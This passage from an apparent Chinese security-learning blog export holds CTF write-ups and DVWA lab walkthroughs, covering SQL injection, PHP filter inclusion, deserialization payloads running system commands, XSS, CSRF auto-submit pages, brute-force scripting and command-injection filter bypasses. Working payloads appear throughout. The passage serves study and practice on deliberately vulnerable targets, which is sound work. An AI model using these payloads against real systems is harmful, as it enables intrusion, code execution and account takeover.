因此，构建payload： 1name=mrl64&#x27;union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;#&amp;pw=1 [GYCTF2020]Blacklist典型的堆叠注入，直接一路show语句查询到列： 12341&#x27;;show databases;# //查库1&#x27;;show tables from supersqli;# //查表1&#x27;;show columns from FlagHere;# //查列1&#x27;;select flag from FlagHere;# //查数据 发现列名flag，但是当我准备查询时，发现select被过滤了： 一片都被过滤了，这里我们用到了handler： 123456789101112131415161718192021222324// 打开一个表名为 tbl_name 的表的句柄HANDLER tbl_name OPEN [ [AS] alias]1、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]2、通过索引查看表FIRST: 获取第一行（索引最小的一行）NEXT: 获取下一行PREV: 获取上一行LAST: 获取最后一行（索引最大的一行） HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT ... ]3、不通过索引查看表READ FIRST: 获取句柄的第一行READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）最后一行执行之后再执行 READ NEXT 会返回一个空的结果 HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT ... ]//关闭已打开的句柄HANDLER tbl_name CLOSE 由于这里我们知道flag在第一列，因此我们构建payload： 1?inject=1&#x27;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;# [BSidesCF 2020]Had a bad day发现点击WOOFERS或者MEOWERS后，URL出现了category参数，想到利用伪协议读取源码： 1?category=php://filter/convert.base64-encode/resource=index 如果读取index.php失败的话可以尝试读取index，这题就是这样的。 base64解码获得的源码(php部分)： 12345678910111213&lt;?php $file = $_GET[&#x27;category&#x27;]; if(isset($file)) &#123; if( strpos( $file, &quot;woofers&quot; ) !== false || strpos( $file, &quot;meowers&quot; ) !== false || strpos( $file, &quot;index&quot;))&#123; include ($file . &#x27;.php&#x27;); &#125; else&#123; echo &quot;Sorry, we currently only support woofers and meowers.&quot;; &#125; &#125;?&gt; 发现这题要求参数中要有woofers、meowers、index才可以运行，那么我们首先尝试直接读取： 1?category=woofers/../flag 发现查看器中出现了新内容，说明包含flag.php成功，但是需要进一步读取。因此我们利用php://filter伪协议可以套一层协议的特性构建payload： 1?category=php://filter/convert.base64-encode/index/resource=flag 同样如果flag.php不行时可以用flag或者flag.txt进行尝试，这题是flag 读取到新的base64码，解码就可以得到flag： [NPUCTF2020]ReadlezPHP查看前端代码发现有文件time.php/?source，进入发现反序列化代码： 12345678910111213141516171819202122232425&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = &quot;Y-m-d h:i:s&quot;; $this-&gt;b = &quot;date&quot;; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$c = new HelloPhp;if(isset($_GET[&#x27;source&#x27;]))&#123; highlight_file(__FILE__); die(0);&#125;@$ppp = unserialize($_GET[&quot;data&quot;]); HelloPhp类型启动时将Y-m-d h:i:s赋值给$a，将date赋值给$b，之后结束类型时执行echo $b($a)，那么在这里就是执行echo date(Y-M-D h:i:s)。 那么我们就可以利用这个性质，构造assert(phpinfo())。assert()与eval()类似，这两者的区别是，前者会把整个字符串参数当做php代码执行，而后者只会把合法的php代码执行，因此我们构建payload： 1234567891011121314151617181920&lt;?phpclass HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = &quot;phpinfo()&quot;; $this-&gt;b = &quot;assert&quot;; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$c = new HelloPhp; echo serialize($c);?&gt;?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125; 最后在phpinfo中查找flag即可： [网鼎杯 2020 青龙组]AreUSerialz开门见码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; 审计完毕后我们发现有两个地方需要绕过： is_valid()会判断字符中是否存在不可打印字符，如果不存在才会返回true，而protected属性的变量在进行序列化时会产生不可打印字符，因此这里将变量属性设置为public即可 只有当op的值为2时才会转到read()中执行file_get_contents($this-&gt;filename)代码，但是在__destruct()中如果检测到op强类型等于2的话将会转化为1，这里涉及到的是强弱类型的比较，将op设定为整数2就可以绕过：1234567891011&lt;?phpclass FileHandler &#123; public $op = 2; public $filename = &quot;flag.php&quot;; public $content;&#125;$a=new FileHandler;echo serialize($a);?&gt;?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125; 查看源码即可获取flag： [网鼎杯 2020 朱雀组]phpweb前端一直在刷新，我们抓包试试，发现POST内容： 1func=date&amp;p=Y-m-d+h%3Ai%3As+a 通过这个我们猜测后端代码类似于是这样的： 1assert($func(&amp;p)) 但是我们常使用system()写入命令时，发现被过滤了，那么我们首先读取源码： 1func=file_get_contents&amp;p=index.php 源码： 123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) &#123; $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) &#123; return $result; &#125; else &#123;return &quot;&quot;;&#125; &#125; class Test &#123; var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() &#123; if ($this-&gt;func != &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) &#123; $func = strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(&quot;Hacker...&quot;); &#125; &#125; ?&gt; 使用的是call_user_func()，本质上没有太大差别。我们发现后端对func进行了严格过滤，但是p没有，并且存在class定义类型，那么就不难想到构建反序列化： 12345678910&lt;?phpclass Test &#123; var $p = &quot;find / -name flag*&quot;; var $func = &quot;system&quot;;&#125;$a=new Test;echo serialize($a);?&gt;func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:18:&quot;find / -name flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125; 找到flag位置，继续构建： 12345678910&lt;?phpclass Test &#123; var $p = &quot;cat /tmp/flagoefiu4r93&quot;; var $func = &quot;system&quot;;&#125;$a=new Test;echo serialize($a);?&gt;func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125; [ZJCTF 2019]NiZhuanSiWei这题运用到了php伪协议和反序列化的知识点，解题过程也是比较巧妙地。首先是源码： 12345678910111213141516171819 &lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 根据源码，这题我们应该要传三个参数，首先是text参数，我们要将welcome to the zjctf写入文件中，那不难想到这里运用了data伪协议进行写入： 1text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= 跳转到新的页面，接下来是file参数，发现审计源码这里有一个文件包含，且提示一个useless.php，我们尝试直接包含发现什么都没有，那同样这里利用php://filter伪协议进行读取： 1file=php://filter/read=convert.base64-encode/resource=useless.php 得到base64码，解码后得到又一段源码： 12345678910111213&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; ?&gt; 发现class新建类，审计发现是用file_get_contents()读取$file，那么我们构建反序列化： 123456789101112131415161718&lt;?php class Flag&#123; //flag.php public $file=&quot;flag.php&quot;; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; $a=new Flag;echo urlencode(serialize($a));?&gt; password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 最后我们整合payload，打开f12，得到flag： 1?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; [BJDCTF2020]ZJCTF，不过如此显示代码审计： 123456789101112131415161718&lt;?phperror_reporting(0);$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; die(&quot;Not now!&quot;); &#125; include($file); //next.php &#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 用php://input或者data伪协议绕过file_get_contents()，发现文件包含，使用php://filter读取，构建payload： 1?file=php://filter/read=convert.base64-encode/resource=next.php&amp;text=data://text/plain,I have a dream 接着读取next.php中的源码： 1234567891011121314151617181920&lt;?php$id = $_GET[&#x27;id&#x27;];$_SESSION[&#x27;id&#x27;] = $id;function complex($re, $str) &#123; return preg_replace( &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\\\1&quot;)&#x27;, $str );&#125;foreach($_GET as $re =&gt; $str) &#123; echo complex($re, $str). &quot;\\n&quot;;&#125;function getFlag()&#123; @eval($_GET[&#x27;cmd&#x27;]);&#125; 这里我们要绕过preg_replace()来读取getFlag()函数，绕过方法可以参考这篇博客：Preg_Replace代码执行漏洞解析 通过那篇博客提供的思路，我们构建payload： 1234/next.php?\\S*=$&#123;getflag()&#125;&amp;cmd=system(&#x27;ls /&#x27;);/next.php?\\S*=$&#123;getflag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);flag&#123;86010810-34fc-4e22-ae9c-3efaf2b0ffe3&#125; system(&#x27;cat /flag&#x27;);","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"XSS学习","slug":"XSS学习","date":"2021-12-16T07:47:22.000Z","updated":"2021-12-16T12:34:45.443Z","comments":true,"path":"2021/12/16/XSS学习/","link":"","permalink":"http://example.com/2021/12/16/XSS%E5%AD%A6%E4%B9%A0/","excerpt":"前言XSS可以说是相当繁杂，但也相当重要。XSS的攻击方式多样，手段更是防不胜防，是DVWA中的重点学习模块。","text":"前言XSS可以说是相当繁杂，但也相当重要。XSS的攻击方式多样，手段更是防不胜防，是DVWA中的重点学习模块。 关于XSSXSS简介XSS（Cross Site Scripting），跨站脚本攻击，为了与层叠样式表（Cascading Style Sheets，简称CSS）做出区分，故简称为XSS。XSS和SQL注入有一定的相似性，这两者都是由于后台程序对用户输入的不严格过滤导致的，但是XSS可以不与数据库交互，而是直接对网页代码进行攻击渗透。 XSS原理黑客将恶意JS代码插入进web中，当用户浏览这个网页时，恶意JS代码被执行，达到黑客的目的。 例如在一个留言板中，我们将&lt;script&gt;alert(&quot;Hey，Hacker!&quot;)&lt;/script&gt;写入，那么此时页面的html代码中将会把这段话插入进去，那么留言板上的代码就变成了： 123&lt;div id=”board” &lt;script&gt;alert(&quot;Hey，Hacker!&quot;)&lt;/script&gt;&lt;/div&gt; 这时如果有用户打开这个留言板，那么浏览器解析html，这时我们写入的JS语句就会被执行，用户的网页上就会弹出写着”Hey，Hacker!”的弹窗。 XSS脚本注入点既然说到XSS与SQL注入是相似的，那么XSS也一定是存在注入点的，下面简单介绍几个常用注入点： HTML标签之间&lt;div&gt;：可以直接写入JS，web会直接执行&lt;title&gt;``&lt;iframe&gt;等包含htmlEncode功能的标签：先闭合标签，再写入JS HTML标签之内插入点在value内，type不为hidden：由于web不会执行在value值内的JS代码，因此要使JS从Value中跳出。可以采用闭合标签等多种方法。插入点在value内，type为hidden：由于标签内容不可显示，这时可以闭合标签或者插入新的type（有两个相同type时第二个失效）。 其它情况属性可执行伪协议：直接输入JavaScript:脚本内容eval()：会直接执行JS语句，因此可以直接输入脚本内容在JS代码中插入：闭合标签或者属性 XSS的危害XSS可以窃取用户正在浏览中的cookie，可以劫持流量造成恶意页面跳转。cookie如果被窃取，可能你的验证信息就会被绕过，而页面跳转结合CSRF更会造成极大的危害。 XSS攻击按照攻击的形式，XSS被分为三类：反射型XSS、储存型XSS以及基于DOM的XSS。 反射型XSS反射型XSS是把恶意JS脚本通过URL传递给服务器，而服务器若没有进行过滤的话，则会把JS脚本反射给用户使得用户的浏览器执行了恶意JS脚本。例如构建url进行反射型XSS来窃取cookie中的内容： 1http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E# 储存型XSS储存型XSS的危害是极大的，由于恶意JS脚本可能被存入数据库中或被以其他方式储存进服务器，那么无论是谁只要再次访问该网页，都有可能执行这段恶意JS脚本。 前文有提到的留言板就是储存型XSS的经典例子之一，除此以外还有还有用户评论、聊天私信等。对比与反射型XSS，储存型XSS不需要用户访问特定URL，只要用户访问恶意网页就可以了。 基于DOM的XSSDOM（Document Object Model），文档对象模型。我们可以通过对象树来认识DOM：而通过这个对象模型，JS可以获得创建动态HTML的权利。这也为XSS创造了条件。 基于DOM的XSS一般不会与服务器进行交互，这个漏洞是由于前端的JS代码不严谨造成的，读取、执行恶意JS代码只由浏览器完成。 总结关于XSS的理论学习暂时就这么多了，理论学习是一定要运用到实践上的，接下来就是完成DVWA的三个XSS的实战练习了。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -XSS","slug":"web-XSS","permalink":"http://example.com/tags/web-XSS/"}]},{"title":"CSRF的学习","slug":"CSRF的学习","date":"2021-12-09T11:54:33.000Z","updated":"2021-12-09T14:49:35.714Z","comments":true,"path":"2021/12/09/CSRF的学习/","link":"","permalink":"http://example.com/2021/12/09/CSRF%E7%9A%84%E5%AD%A6%E4%B9%A0/","excerpt":"前言做DVWA首先遇到的第一个新知识点就是CSRF了，遇到了那学就完事了，多学多练多记肯定是没错的。","text":"前言做DVWA首先遇到的第一个新知识点就是CSRF了，遇到了那学就完事了，多学多练多记肯定是没错的。 什么是CSRFCSRF（Cross-site request forgery），即跨站请求伪造，缩写为CSRF或者XSRF。 简单来说，就是攻击者盗用了你的身份进行各种操作。具体流程可以参考下图： 攻击者通过伪造浏览器请求，向用户之前曾取得信任的网站（即在本地生成了cookie，且必须在同一浏览器下）发送此请求，导致网站接受并认为是用户的操作而执行命令。这个漏洞常常被用来盗号、转账、发送虚假信息等等，利用的是网站只能验证来源用户的浏览器，却不能认证是否为真实该用户进行的操作。 如何检测CSRF漏洞的存在在不存在token的前提下，最简单的方法就是抓包后删去请求头中的Referer再次提交，如果提交仍然有效则说明很大可能存在CSRF漏洞。 当然我们也可以使用CSRFTester、CSRF-Request-Builder等工具进行检测甚至攻击，关于这工具的使用不具体介绍，可以参考下面的博客进行学习：CSRF自动化测试-CSRFTester 利用CSRF漏洞进行攻击GET与REQUEST如果浏览器是以GET方式或REQUEST方式接收请求的话，并且我们了解具体操作的payload，我们就可以在自己搭建的恶意网站中构建一个相似的信息。 例如，某网站的转账操作是这样的： 12http://www.mrl64.com/Transfercount?id=2333&amp;money=1000&amp;for=2233//将2333账户中的1000元转入2233的账户中 那么我就可以在恶意网站中构造写入一个类似的链接，将转账的目标账户写成我的账户： 1http://www.mrl64.com/Transfercount?id=2333&amp;money=1000&amp;for=mrl64 接着我们把这个链接隐藏在我们的网页中，一般采用图片隐藏： 1&lt;img src=&#x27;http://www.mrl64.com/Transfercount?id=2333&amp;money=1000&amp;for=mrl64&#x27;&gt; 这时，只要用户的客户端完成了www.mrl64.com的验证登录并保存了该网站的cookie，我们就可以诱导用户进入我们的恶意网站（客户端tab另一页面），这时我们构建的链接就会连着cookie被发送到www.mrl64.com中，链接如果被网站成功响应，那么2333账户中的1000元就会转入我们的帐中。 而由于_REQUEST[]同样也可以接收以GET请求发送的数据，因此上述的攻击方法同样奏效。 POSTPOST类型的CSRF使用通常要用到自动提交的表单，访问恶意网站后表单自动提交模拟用户进行一次POST。 写表单就需要用到JS了，伪造一份跟转账表单一模一样的表单，然后嵌入到iframe中： 123456789101112131415161718192021&lt;html&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot;&gt; function steal() &#123; iframe = document.frames[&quot;steal&quot;]; iframe.document.Submit(&quot;transfer&quot;); &#125; &lt;/script&gt; &lt;/head&gt; &lt;body onload=&quot;steal()&quot;&gt; &lt;iframe name=&quot;steal&quot; display=&quot;none&quot;&gt; &lt;form method=&quot;POST&quot; name=&quot;Transfercountr&quot; action=&quot;http://www.mrl64.com/Transfercount.php&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;2333&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;money&quot; value=&quot;1000&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;for&quot; value=&quot;mrl64&quot;&gt; &lt;/form&gt; &lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; 大概就像这样。 详细的攻击方法还可以参考下面这篇博客：CSRF 总结CSRF漏洞实际场景中使用频率较低，但危害性极大，相当容易造成大型网络安全事件。CSRF漏洞还可以搭配XSS漏洞进行更隐蔽的攻击，因此CSRF漏洞被判为高危漏洞。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -CSRF","slug":"web-CSRF","permalink":"http://example.com/tags/web-CSRF/"}]},{"title":"DVWA练习","slug":"DVWA练习","date":"2021-12-08T12:43:20.000Z","updated":"2021-12-19T11:57:34.451Z","comments":true,"path":"2021/12/08/DVWA练习/","link":"","permalink":"http://example.com/2021/12/08/DVWA%E7%BB%83%E4%B9%A0/","excerpt":"前言粗略学习过http协议的相关内容，接下来就是刷靶场的环节了。DVWA涵盖了多种常见的web漏洞供我们练习，综合性较强。","text":"前言粗略学习过http协议的相关内容，接下来就是刷靶场的环节了。DVWA涵盖了多种常见的web漏洞供我们练习，综合性较强。 Brute Forcelow根据题目的意思，这题的考点为暴力破解，那么我们将username设置为admin，接着使用burp suite的字典爆破功能爆破出密码就可以了。 或者我们查看源码发现，后端对password进行了md5加密，但是对username没有进行防御，因此我们在username部分进行sql注入也是可以的。 medium这次在源码中username和password都使用了mysqli_real_escape_string()函数进行过滤，将一些特殊字符进行了转义，因此sql注入变得相当困难。 不过由于没有验证cookie等头文件，因此我们仍然可以进行字典爆破。 high123if( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); 在high难度下加入了anti-csrf来随机获取token，并且在每一次登录时都要对token进行检查，因此直接进行字典爆破是无法解开这题的,这里我们对Intruder进行设置： 首先将请求头发送至Intruder中，设置好我们要进行爆破的内容为password与user_token，并且将攻击类型设置为Pitchfork。 接着在Options中找到Grep-Extract，选择Add，先点击一次Refetch response，接着再复制下面返回中的user_token的值，点击ok保存。 然后回到Payload，Payload set首先为1，设置我们要用来爆破的字典，再将Payload set设为2，选择Recursive grep，并进行设置： 设置完之后就可以进行攻击了，如果出现报错提醒可以去检查设置的线程是否为1，如果不为1则将线程改为1，最后效果： 当然这题通过编写python脚本也可以解出，但是由于这个脚本对我来说还是复杂了，就先贴一个网上的： 12345678910111213141516171819202122232425262728293031from bs4 import BeautifulSoupimport requests header=&#123;&#x27;Host&#x27;:&#x27;127.0.0.1&#x27;, &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&#x27;, &#x27;Accept&#x27;:&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;, &#x27;Accept-Language&#x27;:&#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;, &#x27;Referer&#x27;:&#x27;http://127.0.0.1/vulnerabilities/brute/&#x27;, &#x27;cookie&#x27;:&#x27;PHPSESSID=8p4kb7jc1df431lo6qe249quv2; security=high&#x27;, &#x27;Connection&#x27;:&#x27;close&#x27;, &#x27;Upgrade-Insecure-Requests&#x27;:&#x27;1&#x27; &#125;requrl=&quot;http://127.0.0.1/vulnerabilities/brute/&quot; def get_token(requrl,header): response=requests.get(url=requrl,headers=header) print (response.status_code,len(response.content)) soup=BeautifulSoup(response.text,&quot;html.parser&quot;) input=soup.form.select(&quot;input[type=&#x27;hidden&#x27;]&quot;) #返回的是一个list列表 user_token=input[0][&#x27;value&#x27;] #获取用户的token return user_token user_token=get_token(requrl,header)i=0for line in open(&quot;E:\\Password\\mima.txt&quot;): requrl=&quot;http://127.0.0.1/vulnerabilities/brute/?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token i=i+1 print (i , &#x27;admin&#x27; ,line.strip(),end=&quot; &quot;) user_token=get_token(requrl,header) if(i==20): break impossibleimpossible在High的基础上还设置了验证次数，当输入密码错误3次时必须等待15分钟后才能再次输入。因此，当对验证次数进行限制或者添加验证码等情况发生时，暴力破解的方法将被排除。 Command Injection 在DVWA-master\\dvwa\\includes目录下找到dvwaPage.inc.php文件中所有的”charset=utf-8”，修改”charset=gb2312”，即可解决文字乱码问题。 在练习攻防世界时就有介绍过一些命令注入了。那我们还是先来回顾下linux的命令拼接符号： A;B A不论正确与否都会执行B命令 A&amp;B A后台运行；A和B同时执行 A&amp;&amp;B A执行成功时候才会执行B命令 A|B A执行的输出结果，作为B命令的参数，A不论正确与否都会执行B命令 A||B A 执行失败后才会执行B命令 lowlow难度都是没有进行过滤的，因此我们可以直接构造各种命令进行注入，这里拿127.0.0.1&amp;&amp;whoami举例: medium在这个难度下过滤了&amp;&amp;与;，不过由于本质上是黑名单机制，因此还是存在漏洞，我们只需要利用上面没有被过滤的命令拼接符号就可以了。例如：127.0.0.1&amp;whoami high这里的过滤就比较狠了： 12345678910111213141516171819if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = trim($_REQUEST[ &#x27;ip&#x27; ]); // Set blacklist $substitutions = array( &#x27;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, &#x27;| &#x27; =&gt; &#x27;&#x27;, &#x27;-&#x27; =&gt; &#x27;&#x27;, &#x27;$&#x27; =&gt; &#x27;&#x27;, &#x27;(&#x27; =&gt; &#x27;&#x27;, &#x27;)&#x27; =&gt; &#x27;&#x27;, &#x27;`&#x27; =&gt; &#x27;&#x27;, &#x27;||&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 我们可以看到这差不多是过滤干净了，不过这里我们发现在过滤|时真正过滤的是| ，这个后面是有一个空格的，因此，我们构造127.0.0.1|whoami就可以绕过了。 impossible采用了白名单的写法，不仅加入了user_token进行认证，而且还检测被.分割的各个部分是否为数字，如果不为数字类型则返回error。在进行过滤的设置时，白名单的安全性还是比很名单要高很多的。 CSRFlow我们修改密码后发现发送的是GET请求，URL如下： 1http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change# 因此我们可以直接构造一个URL，点击之后便可以直接修改密码： 1http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=mrl64&amp;password_conf=mrl64&amp;Change=Change# 当然在进行CSRF攻击时肯定不能如此直白地攻击，因此我们可以套一个短域名进行伪装，或者编写HTML代码，并将攻击用的URL藏匿起来。如果要编写HTML进行攻击的话，只要标签支持src都可以尝试进行藏匿，比较常用的有scirpt、iframe以及img： 12345678910111213&lt;html&gt;&lt;head&gt; &lt;title&gt;CSRF&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;img src=&quot;http://127.0.0.1/vulnerabilities/csrf/?password_new=mrl64&amp;password_conf=mrl64&amp;Change=Change#&quot;&gt;&lt;!--&lt;iframe src=&quot;http://127.0.0.1/vulnerabilities/csrf/?password_new=mrl64&amp;password_conf=mrl64&amp;Change=Change#&quot; style=&quot;display:none;&quot;&gt;&lt;/iframe&gt;--&gt;&lt;!--&lt;script src=&quot;http://127.0.0.1/vulnerabilities/csrf/?password_new=mrl64&amp;password_conf=mrl64&amp;Change=Change#&quot;&gt;&lt;/script&gt;--&gt;&lt;/body&gt;&lt;/html&gt; medium这个难度下多进行了一次Referer的比较判断： 1if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) spripos(string,find[,start])：从start位置开始查找find中string第一次出现的位置 因此我们需要对Referer的值进行校正，在本地环境下自然可以用burp suite工具抓包更改请求头，但是实战中不会有人好心帮你更改Referer的。因此我们需要构建表单来进行绕过： 123456789101112131415&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;CSRF&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form method=&quot;get&quot; id=&quot;csrf&quot; action=&quot;http://127.0.0.1/vulnerabilities/csrf/&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;mrl64&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;mrl64&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;&lt;/form&gt;&lt;script&gt; document.forms[&quot;csrf&quot;].submit(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 这里用到了&lt;script&gt; document.forms[&quot;csrf&quot;].submit(); &lt;/script&gt;进行了对id为csrf表单的自动提交 最后让用户访问url并自动提交即可： 